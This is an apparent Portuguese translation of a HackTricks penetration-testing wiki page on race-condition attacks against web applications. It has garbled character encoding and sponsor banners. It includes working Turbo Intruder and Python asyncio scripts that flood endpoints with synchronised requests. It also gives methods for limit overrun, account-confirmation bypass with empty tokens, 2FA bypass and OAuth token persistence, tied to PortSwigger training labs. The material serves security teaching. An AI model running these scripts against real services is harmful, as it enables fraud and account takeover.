# Condi√ß√£o de Corrida

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou nos siga no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
Para obter uma compreens√£o profunda dessa t√©cnica, confira o relat√≥rio original em [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Aperfei√ßoando Ataques de Condi√ß√£o de Corrida

O principal obst√°culo para aproveitar as condi√ß√µes de corrida √© garantir que m√∫ltiplas solicita√ß√µes sejam tratadas ao mesmo tempo, com **muito pouca diferen√ßa em seus tempos de processamento‚Äîidealmente, menos de 1ms**.

Aqui voc√™ pode encontrar algumas t√©cnicas para Sincroniza√ß√£o de Solicita√ß√µes:

#### Ataque de √önico Pacote HTTP/2 vs. Sincroniza√ß√£o de √öltimo Byte HTTP/1.1

- **HTTP/2**: Suporta o envio de duas solicita√ß√µes por uma √∫nica conex√£o TCP, reduzindo o impacto da oscila√ß√£o de rede. No entanto, devido a varia√ß√µes do lado do servidor, duas solicita√ß√µes podem n√£o ser suficientes para um exploit consistente de condi√ß√£o de corrida.
- **HTTP/1.1 'Sincroniza√ß√£o de √öltimo Byte'**: Permite o pr√©-envio da maioria das partes de 20-30 solicita√ß√µes, retendo um pequeno fragmento, que √© ent√£o enviado juntamente, alcan√ßando a chegada simult√¢nea ao servidor.

A **Prepara√ß√£o para a Sincroniza√ß√£o de √öltimo Byte** envolve:
1. Enviar cabe√ßalhos e dados do corpo menos o √∫ltimo byte sem encerrar o fluxo.
2. Pausar por 100ms ap√≥s o envio inicial.
3. Desativar o TCP_NODELAY para utilizar o algoritmo de Nagle para agrupar quadros finais.
4. Fazer um ping para aquecer a conex√£o.

O subsequente envio de quadros retidos deve resultar em sua chegada em um √∫nico pacote, verific√°vel via Wireshark. Este m√©todo n√£o se aplica a arquivos est√°ticos, que normalmente n√£o est√£o envolvidos em ataques de CC.

### Adaptando-se √† Arquitetura do Servidor

Compreender a arquitetura do alvo √© crucial. Servidores front-end podem rotear solicita√ß√µes de forma diferente, afetando o tempo. O aquecimento da conex√£o do lado do servidor de forma preventiva, por meio de solicita√ß√µes inconsequentes, pode normalizar o tempo de solicita√ß√£o.

#### Lidando com Bloqueios Baseados em Sess√£o

Frameworks como o manipulador de sess√£o do PHP serializam solicita√ß√µes por sess√£o, potencialmente obscurecendo vulnerabilidades. Utilizar tokens de sess√£o diferentes para cada solicita√ß√£o pode contornar esse problema.

#### Superando Limites de Taxa ou Recursos

Se o aquecimento da conex√£o for ineficaz, provocar intencionalmente atrasos nos limites de taxa ou recursos dos servidores web atrav√©s de uma inunda√ß√£o de solicita√ß√µes fict√≠cias pode facilitar o ataque de √∫nico pacote, induzindo um atraso do lado do servidor prop√≠cio a condi√ß√µes de corrida.


## Exemplos de Ataque

* **Tubo Intruder - Ataque de √∫nico pacote HTTP2 (1 endpoint)**: Voc√™ pode enviar a solicita√ß√£o para o **Turbo Intruder** (`Extens√µes` -> `Turbo Intruder` -> `Enviar para o Turbo Intruder`), voc√™ pode alterar na solicita√ß√£o o valor que deseja for√ßar bruta para **`%s`** como em `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` e ent√£o selecionar o **`exemplos/race-single-packer-attack.py`** no menu suspenso:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se voc√™ for enviar **valores diferentes**, voc√™ poderia modificar o c√≥digo com este que usa uma lista de palavras da √°rea de transfer√™ncia:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Se a web n√£o suportar HTTP2 (apenas HTTP1.1), use `Engine.THREADED` ou `Engine.BURP` em vez de `Engine.BURP2`.
{% endhint %}

* **Intruder de Tubo - Ataque de pacote √∫nico HTTP2 (V√°rios endpoints)**: Caso precise enviar uma solicita√ß√£o para 1 endpoint e depois v√°rias para outros endpoints para acionar o RCE, voc√™ pode alterar o script `race-single-packet-attack.py` para algo como:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Tamb√©m est√° dispon√≠vel no **Repeater** atrav√©s da nova op√ß√£o '**Enviar grupo em paralelo**' no Burp Suite.
* Para **limit-overrun** voc√™ poderia simplesmente adicionar a **mesma solicita√ß√£o 50 vezes** no grupo.
* Para **aquecimento de conex√£o**, voc√™ poderia **adicionar** no **in√≠cio** do **grupo** algumas **solicita√ß√µes** para alguma parte n√£o est√°tica do servidor web.
* Para **atrasar** o processo **entre** o processamento **de uma solicita√ß√£o e outra** em etapas de 2 subestados, voc√™ poderia **adicionar solicita√ß√µes extras entre** ambas as solicita√ß√µes.
* Para um RC de **m√∫ltiplos pontos finais**, voc√™ poderia come√ßar enviando a **solicita√ß√£o** que **vai para o estado oculto** e ent√£o **50 solicita√ß√µes** logo ap√≥s que **exploram o estado oculto**.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Bruto BF

Antes da pesquisa anterior, essas eram algumas cargas √∫teis usadas que apenas tentavam enviar os pacotes o mais r√°pido poss√≠vel para causar um RC.

* **Repeater:** Verifique os exemplos da se√ß√£o anterior.
* **Intruder**: Envie a **solicita√ß√£o** para o **Intruder**, defina o **n√∫mero de threads** para **30** dentro do menu **Op√ß√µes e**, selecione como carga √∫til **Cargas √∫teis nulas** e gere **30.**
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodologia RC**

### Limite de estouro / TOCTOU

Este √© o tipo mais b√°sico de condi√ß√£o de corrida onde **vulnerabilidades** que **aparecem** em lugares que **limitam o n√∫mero de vezes que voc√™ pode realizar uma a√ß√£o**. Como usar o mesmo c√≥digo de desconto em uma loja online v√°rias vezes. Um exemplo muito f√°cil pode ser encontrado neste [**relat√≥rio**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ou neste [**bug**](https://hackerone.com/reports/759247)**.**

Existem muitas varia√ß√µes desse tipo de ataque, incluindo:

* Resgatar um cart√£o-presente v√°rias vezes
* Avaliar um produto v√°rias vezes
* Sacar ou transferir dinheiro acima do saldo da sua conta
* Reutilizar uma solu√ß√£o CAPTCHA √∫nica
* Bypass de um limite de taxa anti-brute-force

### **Subestados ocultos**

Explorar condi√ß√µes de corrida complexas frequentemente envolve aproveitar breves oportunidades para interagir com subestados ocultos ou **n√£o intencionais da m√°quina**. Veja como abordar isso:

1. **Identificar Subestados Ocultos Potenciais**
- Comece identificando endpoints que modificam ou interagem com dados cr√≠ticos, como perfis de usu√°rio ou processos de redefini√ß√£o de senha. Concentre-se em:
- **Armazenamento**: Prefira endpoints que manipulam dados persistentes do lado do servidor em vez daqueles que lidam com dados do lado do cliente.
- **A√ß√£o**: Procure opera√ß√µes que alteram dados existentes, que s√£o mais propensas a criar condi√ß√µes explor√°veis ‚Äã‚Äãem compara√ß√£o com aquelas que adicionam novos dados.
- **Chaveamento**: Ataques bem-sucedidos geralmente envolvem opera√ß√µes com chave no mesmo identificador, por exemplo, nome de usu√°rio ou token de redefini√ß√£o.

2. **Conduzir Sondagem Inicial**
- Teste os endpoints identificados com ataques de condi√ß√£o de corrida, observando quaisquer desvios dos resultados esperados. Respostas inesperadas ou mudan√ßas no comportamento do aplicativo podem sinalizar uma vulnerabilidade.

3. **Demonstrar a Vulnerabilidade**
- Reduza o ataque para o n√∫mero m√≠nimo de solicita√ß√µes necess√°rias para explorar a vulnerabilidade, muitas vezes apenas duas. Esta etapa pode exigir v√°rias tentativas ou automa√ß√£o devido ao timing preciso envolvido.

### Ataques Sens√≠veis ao Tempo

A precis√£o no timing das solicita√ß√µes pode revelar vulnerabilidades, especialmente quando m√©todos previs√≠veis como carimbos de data e hora s√£o usados para tokens de seguran√ßa. Por exemplo, gerar tokens de redefini√ß√£o de senha com base em carimbos de data e hora poderia permitir tokens id√™nticos para solicita√ß√µes simult√¢neas.

**Para Explorar:**
- Use timing preciso, como um ataque de pacote √∫nico, para fazer solicita√ß√µes de redefini√ß√£o de senha simult√¢neas. Tokens id√™nticos indicam uma vulnerabilidade.

**Exemplo:**
- Solicite dois tokens de redefini√ß√£o de senha ao mesmo tempo e compare-os. Tokens correspondentes sugerem uma falha na gera√ß√£o de token.

**Confira este [Laborat√≥rio PortSwigger](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) para tentar isso.**


## Estudos de caso de subestados ocultos

### Pagar e adicionar um item

Confira este [**Laborat√≥rio PortSwigger**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) para ver como **pagar** em uma loja e **adicionar um item extra** que **n√£o precisar√° pagar por ele**.

### Confirmar outros e-mails

A ideia √© **verificar um endere√ßo de e-mail e alter√°-lo para um diferente ao mesmo tempo** para descobrir se a plataforma verifica o novo alterado.

### Alterar e-mail para 2 endere√ßos de e-mail baseados em Cookie

De acordo com [**esta pesquisa**](https://portswigger.net/research/smashing-the-state-machine) o Gitlab estava vulner√°vel a uma tomada de controle dessa maneira porque poderia **enviar** o **token de verifica√ß√£o de e-mail de um e-mail para o outro e-mail**.

**Confira este [Laborat√≥rio PortSwigger](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) para tentar isso.**

### Estados ocultos do banco de dados / Bypass de confirma√ß√£o

Se **2 grava√ß√µes diferentes** s√£o usadas para **adicionar** **informa√ß√µes** dentro de um **banco de dados**, h√° um pequeno per√≠odo de tempo em que **apenas os primeiros dados foram gravados** no banco de dados. Por exemplo, ao criar um usu√°rio, o **nome de usu√°rio** e a **senha** podem ser **gravados** e **ent√£o o token** para confirmar a conta rec√©m-criada √© gravado. Isso significa que por um curto per√≠odo de tempo o **token para confirmar uma conta √© nulo**.

Portanto, **registrar uma conta e enviar v√°rias solicita√ß√µes com um token vazio** (`token=` ou `token[]=` ou qualquer outra varia√ß√£o) para confirmar a conta imediatamente poderia permitir **confirmar uma conta** onde voc√™ n√£o controla o e-mail.

**Confira este [Laborat√≥rio PortSwigger](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) para tentar isso.**

### Bypass 2FA

O pseudo-c√≥digo a seguir √© vulner√°vel a condi√ß√£o de corrida porque em um tempo muito curto o **2FA n√£o √© aplicado** enquanto a sess√£o √© criada:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Persist√™ncia eterna do OAuth2

Existem v√°rios [**provedores de OAuth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Esses servi√ßos permitir√£o que voc√™ crie um aplicativo e autentique usu√°rios registrados pelo provedor. Para fazer isso, o **cliente** precisar√° **permitir que seu aplicativo** acesse alguns de seus dados dentro do **provedor de OAuth**.\
Portanto, at√© aqui √© apenas um login comum com google/linkedin/github... onde voc√™ √© solicitado com uma p√°gina dizendo: "_O aplicativo \<InsertCoolName> deseja acessar suas informa√ß√µes, voc√™ deseja permitir?_"

#### Condi√ß√£o de corrida em `authorization_code`

O **problema** surge quando voc√™ **aceita** e automaticamente envia um **`authorization_code`** para o aplicativo malicioso. Em seguida, este **aplicativo abusa de uma Condi√ß√£o de Corrida no provedor de servi√ßos de OAuth para gerar mais de um AT/RT** (_Authentication Token/Refresh Token_) a partir do **`authorization_code`** para sua conta. Basicamente, ele abusar√° do fato de voc√™ ter aceitado o aplicativo para acessar seus dados e **criar√° v√°rias contas**. Ent√£o, se voc√™ **parar de permitir que o aplicativo acesse seus dados, um par de AT/RT ser√° exclu√≠do, mas os outros ainda ser√£o v√°lidos**.

#### Condi√ß√£o de corrida em `Refresh Token`

Uma vez que voc√™ **obteve um RT v√°lido**, voc√™ poderia tentar **abusar dele para gerar v√°rios AT/RT** e **mesmo se o usu√°rio cancelar as permiss√µes** para o aplicativo malicioso acessar seus dados, **v√°rios RTs ainda ser√£o v√°lidos**.

## **RC em WebSockets**

Em [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) voc√™ pode encontrar um PoC em Java para enviar mensagens de websocket em **paralelo** para abusar de **Condi√ß√µes de Corrida tamb√©m em Web Sockets**.

## Refer√™ncias

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, alimentados pelas ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
